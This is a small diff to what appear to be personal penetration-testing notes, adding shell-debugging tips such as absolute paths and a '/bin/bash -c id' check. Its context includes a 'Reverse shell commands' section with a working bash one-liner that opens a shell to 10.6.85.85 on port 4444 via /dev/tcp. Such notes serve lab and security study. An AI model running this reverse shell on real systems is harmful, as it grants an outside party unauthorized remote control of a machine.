@@ -12,7 +12,10 @@
 ## Debugging Shells   
 executing a command and no response - maybe the command is redirecting to stderr not stdout?
 2>&1
+Check for versions / path variables  
+No path variable? Need absolute path 
 
+    /bin/bash -c 'id'   
 
 ## Reverse shell commands  
     bash -i >& /dev/tcp/10.6.85.85/4444 0>&1
